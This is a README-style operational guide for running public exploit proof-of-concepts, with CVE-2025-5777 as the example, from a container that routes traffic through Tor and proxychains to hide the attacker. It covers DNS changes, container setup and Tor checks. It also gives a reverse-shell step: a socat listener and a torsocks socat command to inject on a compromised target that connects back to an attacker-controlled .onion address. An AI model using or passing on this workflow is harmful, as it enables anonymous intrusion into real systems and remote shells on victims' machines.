### Execute exploit from a docker container with proxychains

1. Locate python exploit

> [!NOTE]
> using exploits/2025/CVE-2025-5777 as an example

```bash
cp -r ../2025/CVE-2025-5777 .
```

2. Modify Dockerfile

```bash
# modify the path
# change path with updated virtual env name
ENV PATH=/exploit-base/bin:/usr/local/bin:/usr/bin:$PATH \

# directory of python exploit PoC
# example using CVE-2025-5777
COPY CVE-2025-5777/* .

# Create requirements.txt if needed
# or install seperately like below without requirements.txt
python3 -m pip install --upgrade <insert dep1> <insert dep2> <insert dep3> on and on \
```

3. Run

```bash
# change dns, using quad9 - change this to nameserver other than ISP
sudo mv /etc/resolv.conf /etc/resolv.conf.bak
sudo touch /etc/resolv.conf
echo -ne 'nameserver 9.9.9.9\nnameserver 149.112.112.112' | sudo tee -a /etc/resolv.conf

# replace CVE with whatever CVE using
podman build --format docker -t cve-2025-5777 .

podman run -it --name cve-2025-5777 \
    --cap-add=net_admin \
    --device /dev/net/tun \
    -v /etc/resolv.conf:/etc/resolv.conf:ro \
    -p 127.0.0.1:8118:8118 -p 127.0.0.1:9050:9050 -p 127.0.0.1:9051:9051 \
    -d cve-2025-5777

# verify tor is finished bootstrapping
podman logs cve-2025-5777

[notice] Bootstrapped 100% (done): Done

# test tor connection
podman exec cve-2025-5777 curl --socks5 localhost:9050 --socks5-hostname localhost:9050 https://check.torproject.org/api/ip

# test proxychains
podman exec cve-2025-5777 proxychains curl https://check.torproject.org/api/ip

# verify privoxy
podman exec cve-2025-5777 curl -Lx http://127.0.0.1:8118 http://checkip.amazonaws.com/
```

4. Execute

```bash
podman exec -it cve-2025-5777 /bin/bash

proxychains python3 <some exploit>.py --someparam somevalue --someparam somevalue on and on
```

### NOTE: how to move files into a running container:
```bash
cp -r <dir_to_files> $(pwd)
tar Ccf $(dirname ./) - $(basename ./) | podman exec -i <container_name> tar Cxf /exploit-base -
```

5. Reverse Shell

```bash
# note: tor/socat will have to be installed on target
LHOST=$(cat /var/lib/tor/hidden_service/hostname)
# line 108 in Dockerfile sets port, make sure it's the same port
LPORT=4444
RSHELL="socat file:$(tty),raw,echo=0 TCP-L:$LPORT"

# open a shell for listener
podman exec -it cve-2025-5777 /bin/bash
$RSHELL

# new shell
echo $LHOST
a2w6cyja3wtgn5mzbvj4vgmypezg66dar2aw6ylbkwpfv7wmz3udsnid.onion

# cmd on target, using exploit with RCE function - the cmd below to inject
torsocks socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:a2w6cyja3wtgn5mzbvj4vgmypezg66dar2aw6ylbkwpfv7wmz3udsnid.onion:4444
```

happy python hacking!